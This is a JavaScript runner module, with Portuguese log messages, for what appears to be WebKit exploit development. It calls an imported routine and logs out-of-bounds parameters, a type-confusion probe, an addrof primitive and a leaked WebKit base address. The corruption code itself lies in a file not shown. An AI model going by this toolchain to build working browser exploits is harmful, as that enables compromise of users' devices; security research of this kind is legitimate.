// js/script3/runAllAdvancedTestsS3.mjs (Adaptado para Getter em M2 para Addrof)
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import {
    executeTypedArrayVictimAddrofAndWebKitLeak_R43,
    FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT
} from './testArrayBufferVictimCrash.mjs';

async function runHeisenbugReproStrategy_TypedArrayVictim_R43() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_R43_GetterOnM2";
    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);
    const result = await executeTypedArrayVictimAddrofAndWebKitLeak_R43();

    const module_name_for_title = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;

    if (result.errorOccurred) {
        logS3(`  RUNNER R43(GetterOnM2): Teste principal capturou ERRO: ${String(result.errorOccurred)}`, "critical", FNAME_RUNNER);
        document.title = `${module_name_for_title}: MainTest ERR!`;
    } else if (result) {
        let paramsUsedMsg = 'N/A';
        if (result.oob_params_used) { // O script de teste agora preenche oob_params_used
            paramsUsedMsg = `Offset: ${result.oob_params_used.offset}, Valor: ${result.oob_params_used.value}`;
        } else if (result.oob_value_of_best_result) {
             paramsUsedMsg = `OOB Value (fallback): ${result.oob_value_of_best_result}`;
        }

        logS3(`  RUNNER R43(GetterOnM2): Completou. Parâmetros OOB usados: ${paramsUsedMsg}`, "good", FNAME_RUNNER);
        logS3(`  RUNNER R43(GetterOnM2): Detalhes Sonda TC: ${result.tc_probe_details ? JSON.stringify(result.tc_probe_details) : 'N/A'}`, "leak_detail", FNAME_RUNNER);

        const heisenbugSuccessfullyDetected = result.heisenbug_on_M2_in_best_result; // Campo padrão
        const addrofResult = result.addrof_result;
        const webkitLeakResult = result.webkit_leak_result;
        const getterOnM2Details = result.getter_on_m2_addrof_details; // Novo campo

        logS3(`  RUNNER R43(GetterOnM2): Heisenbug TC Sonda: ${heisenbugSuccessfullyDetected ? "CONFIRMADA" : "NÃO CONFIRMADA"}`, heisenbugSuccessfullyDetected ? "vuln" : "warn", FNAME_RUNNER);

        if (getterOnM2Details) {
            logS3(`  RUNNER R43(GetterOnM2): Detalhes da Tentativa de Addrof via Getter em M2:`, "info_emphasis", FNAME_RUNNER);
            logS3(`    Tentativa realizada: ${getterOnM2Details.attempted}`, "info", FNAME_RUNNER);
            logS3(`    Sucesso: ${getterOnM2Details.success}`, getterOnM2Details.success ? "success_major" : "warn", FNAME_RUNNER);
            logS3(`    Notas: ${getterOnM2Details.notes}`, "info", FNAME_RUNNER);
            if (getterOnM2Details.leaked_address_str) {
                logS3(`    Endereço Vazado: ${getterOnM2Details.leaked_address_str}`, "leak", FNAME_RUNNER);
            }
            logS3(`    Raw Low/High: 0x${(getterOnM2Details.raw_low || 0).toString(16)} / 0x${(getterOnM2Details.raw_high || 0).toString(16)}`, "leak_detail");
        }
        
        if (addrofResult) {
             logS3(`  RUNNER R43(GetterOnM2): Resultado Geral Addrof: ${addrofResult.msg} (Endereço: ${addrofResult.leaked_object_addr || 'N/A'})`, addrofResult.success ? "vuln" : "warn", FNAME_RUNNER);
        }

        if (webkitLeakResult) {
            logS3(`  RUNNER R43(GetterOnM2): Teste WebKit Base Leak: ${webkitLeakResult.msg} (Base: ${webkitLeakResult.webkit_base_candidate || 'N/A'})`, webkitLeakResult.success ? "vuln" : "info", FNAME_RUNNER);
        }

        let finalTitleSegment = "No Notable Result";
        // ... (lógica do título como no script anterior, baseada em webkitLeakResult.success, addrofResult.success, heisenbugSuccessfullyDetected)
        if (webkitLeakResult?.success) {
            finalTitleSegment = "WebKitLeak SUCCESS!";
        } else if (addrofResult?.success) {
            finalTitleSegment = "Addrof SUCCESS, WebKitLeak Fail/Skipped";
        } else if (heisenbugSuccessfullyDetected) {
            finalTitleSegment = "TC Confirmed, Addrof Fail";
        }
        document.title = `${module_name_for_title}_R43_GetterOnM2: ${finalTitleSegment}`;


        if (result.iteration_results_summary && result.iteration_results_summary.length > 0) {
            logS3(`  RUNNER R43(GetterOnM2): Sumário da Iteração (apenas 1):`, "info", FNAME_RUNNER);
            const iter_sum = result.iteration_results_summary[0];
            const tcSuccess = iter_sum.heisenbug_on_M2_confirmed_by_tc_probe;
            const addrofSuccess = iter_sum.addrof_result_this_iter?.success; // Reflete o sucesso do getter em M2
            let logMsg = `    Iter 1 (OOB ${iter_sum.oob_value}): TC=${tcSuccess}, Addrof(GetterOnM2)=${addrofSuccess}`;
            if(iter_sum.error) logMsg += `, Err: ${iter_sum.error}`;
            logS3(logMsg, "info", FNAME_RUNNER);
        }

    } else {
        document.title = `${module_name_for_title}_R43_GetterOnM2: Invalid Result Obj`;
    }
    logS3(`  Título da página final: ${document.title}`, "info", FNAME_RUNNER);
    await PAUSE_S3(MEDIUM_PAUSE_S3);
    logS3(`==== Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_MainOrchestrator_GetterOnM2`;
    logS3(`==== INICIANDO Script 3 R43_GetterOnM2 (${FNAME_ORCHESTRATOR}) ... ====`, 'test', FNAME_ORCHESTRATOR);
    await runHeisenbugReproStrategy_TypedArrayVictim_R43();
    logS3(`\n==== Script 3 R43_GetterOnM2 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    const runBtn = getRunBtnAdvancedS3(); if (runBtn) runBtn.disabled = false;

    if (document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT) &&
        !document.title.includes("SUCCESS") && !document.title.includes("Fail") &&
        !document.title.includes("OK") && !document.title.includes("Confirmed") &&
        !document.title.includes("ERR") && !document.title.includes("Invalid")) {
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_R43_GetterOnM2_Done`;
    }
}
